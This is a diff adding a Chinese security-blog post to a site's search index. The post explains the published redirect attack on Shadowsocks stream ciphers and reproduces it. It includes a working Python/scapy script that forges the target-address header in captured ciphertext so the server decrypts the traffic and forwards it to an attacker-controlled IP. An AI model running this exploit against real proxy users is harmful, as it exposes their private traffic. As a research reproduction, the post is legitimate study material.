@@ -1,6 +1,70 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Shadowsocks协议重定向攻击</title>
+    <url>/2020/02/29/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<p>Shadowsocks是一个基于SOCKS5的代理软件，其主要用途就不用解释了， 其协议存在漏洞，可以通过重定向攻击解密shadowsocks数据包密文。以下总结参考自<a href="https://github.com/edwardz246003/shadowsocks" target="_blank" rel="noopener">Zhiniang Peng</a>的研究成果</p>
+<a id="more"></a>
+
+<h2 id="Shadowsocks工作原理"><a href="#Shadowsocks工作原理" class="headerlink" title="Shadowsocks工作原理"></a>Shadowsocks工作原理</h2><p>sslocal运行于本地，并监听某端口（默认1080）提供代理服务，ssserver运行于远程服务器，并监听某端口（默认8388）接收来自sslocal的数据</p>
+<p>浏览器设置代理，所有请求首先发给sslocal，sslocal将数据进行加密后发给ssserver，ssserver解密数据包，并转发浏览器的请求，然后将结果加密返回，sslocal解密并返回给浏览器</p>
+<p>client &lt;—&gt; ss-local &lt;–[encrypted]–&gt; ss-remote &lt;—&gt; target</p>
+<p><img src="/2020/02/29/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227152619465.png" alt="image-20200227152619465"></p>
+<p>可以通过pip安装python版Shadowsocks，在包存放路径下找到源码</p>
+<p><code>python3 -m pip install shadowsocks</code></p>
+<h3 id="请求流程"><a href="#请求流程" class="headerlink" title="请求流程"></a>请求流程</h3><p>sslocal通过发送以目标地址开头，后跟请求数据的包的密文来启动与ssserver的TCP连接</p>
+<p><code>message=[target address][payload]</code></p>
+<p><code>ciphertext=Stream_encrypt(key,IV,message)</code></p>
+<p>最后发送的其实就是<code>随机生成的16字节的IV+ciphertext</code></p>
+<p>ssserver接收数据并解密</p>
+<p><code>message=Stream_decrypt(key,IV,ciphertext)</code>  </p>
+<p>并解析出<code>[target address]</code>。 然后与<code>[target address]</code>建立新的TCP连接，并向目标转发请求。ssserver接收到来自<code>[target address]</code>的回复，进行加密并将其转发回sslocal，直到sslocal断开连接</p>
+<p>sslocal收到的数据也是</p>
+<p><code>随机生成的16字节的IV+response的密文</code></p>
+<h3 id="Address-格式"><a href="#Address-格式" class="headerlink" title="Address 格式"></a>Address 格式</h3><p>第一个字节用以说明地址类型</p>
+<ul>
+<li><p>0x01：host是4字节的IPv4地址</p>
+</li>
+<li><p>0x03：host是可变长度的字符串，以1个字节开头作为长度，后跟最多255个字节的域名</p>
+</li>
+<li><p>0x04：host是一个16字节的IPv6地址</p>
+</li>
+</ul>
+<p>端口号是一个2字节无符号整数</p>
+<p><code>[1-byte type][variable-length host][2-byte port]</code></p>
+<h2 id="AES-256-CFB"><a href="#AES-256-CFB" class="headerlink" title="AES-256-CFB"></a>AES-256-CFB</h2><p>以AES-256-CFB加密方式为例</p>
+<p><img src="/2020/02/29/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227162247002.png" alt="image-20200227162247002"></p>
+<p>这种加密方式，明文和密文是等长的，解密过程如上。如果将密文的第一个块从c1修改为c1’，那么第一个明文块将从p1变为p1’，第二个分组的数据将会错误解密</p>
+<p><img src="/2020/02/29/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227170902068.png" alt="image-20200227170902068"></p>
+<p>他们的关系如下</p>
+<blockquote>
+<p>c1’=xor(c1,r)<br>p1’=xor(p1,r)</p>
+</blockquote>
+<h2 id="请求重定向攻击"><a href="#请求重定向攻击" class="headerlink" title="请求重定向攻击"></a>请求重定向攻击</h2><p>再回顾一下sslocal发送给ssserver的数据</p>
+<p><code>IV+encrypt([target address][payload])</code></p>
+<p>其中<code>[payload]</code>是加密的无法得知，但如果能控制<code>[target address]</code>并将其改为自己可控的服务器端<code>[evil address]</code>再将修改后的包发送给ssserver，那么ssserver岂不是帮我们解密了<code>[payload]</code>并且将请求转发到了<code>[evil address]</code></p>
+<p>假设使用的是IPv4地址，那么要构造一个<code>[target address]</code>，就需要控制p1’的前7个字节，需要控制p1’的前7个字节就需要知道p1的前7个字节</p>
+<p>而HTTP的响应包前7个字节是固定的，即<code>HTTP/1.</code></p>
+<h3 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h3><p>服务端运行ssserver</p>
+<p><img src="/2020/02/29/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227174302999.png" alt="image-20200227174302999"></p>
+<p>客户端我用python版的时候有点小问题，所以就直接用这个了</p>
+<p><img src="/2020/02/29/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227174500978.png" alt="image-20200227174500978"></p>
+<p>用wireshark开始抓包，并使用curl通过代理请求百度，保存抓包结果p.pcapng</p>
+<p><img src="/2020/02/29/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227174710233.png" alt="image-20200227174710233"></p>
+<p>攻击代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> rdpcap</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">packets = rdpcap(<span class="string">"p.pcapng"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ssserver的ip和端口，用以筛选数据包和发送修改后的数据包</span></span><br><span class="line">sport=<span class="number">8388</span></span><br><span class="line">src=<span class="string">"xx.xx.xx.xx"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#要转发的目标地址，用以接收解密后的数据</span></span><br><span class="line">target_ip = <span class="string">"xx.xx.xx.xx"</span></span><br><span class="line">target_port = <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"TCP"</span> <span class="keyword">in</span> packet <span class="keyword">and</span> packet[<span class="string">'TCP'</span>].payload:</span><br><span class="line">        <span class="comment">#筛选一下数据包，需要ssserver返回给sslocal的数据包</span></span><br><span class="line">        <span class="keyword">if</span> packet[<span class="string">"IP"</span>].src==src <span class="keyword">and</span> packet[<span class="string">"TCP"</span>].sport==sport <span class="keyword">and</span> len(packet[<span class="string">'TCP'</span>].payload.load)&gt;<span class="number">16</span>:</span><br><span class="line">            <span class="comment">#分隔出16字节的随机IV和数据密文</span></span><br><span class="line">            recv_iv, recv_data=packet[<span class="string">'TCP'</span>].payload.load[:<span class="number">16</span>],packet[<span class="string">'TCP'</span>].payload.load[<span class="number">16</span>:]</span><br><span class="line">            <span class="comment">#HTTP响应包的前7位固定是HTTP/1.</span></span><br><span class="line">            predict_data = <span class="string">b"HTTP/1."</span></span><br><span class="line">            <span class="comment">#在关系式 c1'=xor(c1,r) p1'=xor(p1,r) 中，predict_xor_key相当于计算r</span></span><br><span class="line">            predict_xor_key = bytes([(predict_data[i] ^ recv_data[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(predict_data))])</span><br><span class="line">            <span class="comment">#构造[evil address]</span></span><br><span class="line">            fake_header = <span class="string">b'\x01'</span> + socket.inet_pton(socket.AF_INET, target_ip) + bytes(struct.pack(<span class="string">'&gt;H'</span>, target_port))</span><br><span class="line">            <span class="comment">#计算[evil address]的密文</span></span><br><span class="line">            fake_header = bytes([(fake_header[i] ^ predict_xor_key[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(fake_header))])</span><br><span class="line">            <span class="comment">#拼接修改后的数据</span></span><br><span class="line">            fake_data = recv_iv + fake_header + recv_data[len(fake_header):]</span><br><span class="line">            print(fake_data.hex())</span><br><span class="line">            s = socket.socket()</span><br><span class="line">            <span class="comment">#将修改后的数据发送给ssserver</span></span><br><span class="line">            s.connect((src, sport))</span><br><span class="line">            s.send(fake_data)</span><br><span class="line">            print(<span class="string">'Tcp sending... '</span>)</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">            s.close()</span><br></pre></td></tr></table></figure>
+
+<p>在target_ip监听相应端口即可收到解密后的HTTP响应包</p>
+<p><img src="/2020/02/29/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227180856311.png" alt="image-20200227180856311"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/edwardz246003/shadowsocks" target="_blank" rel="noopener">Redirect attack on Shadowsocks stream ciphers</a></p>
+<p><a href="https://www.ioiogoo.cn/2016/12/22/shadowsocks%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/" target="_blank" rel="noopener">shadowsocks源码解读（一）：基本流程</a></p>
+<p><a href="https://www.leadroyal.cn/?p=1036" target="_blank" rel="noopener">ss协议漏洞的复现和利用</a></p>
+]]></content>
+      <tags>
+        <tag>Shadowsocks</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>FastJson 1.2.24 反序列化</title>
     <url>/2020/02/25/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<p>FastJson是一个Java语言编写的高性能功能完善的JSON库，可以将数据在JSON和Java Object之间互相转换，涉及到序列化和反序列化的操作，由此从1.2.24版本便开始爆出反序列化漏洞</p>
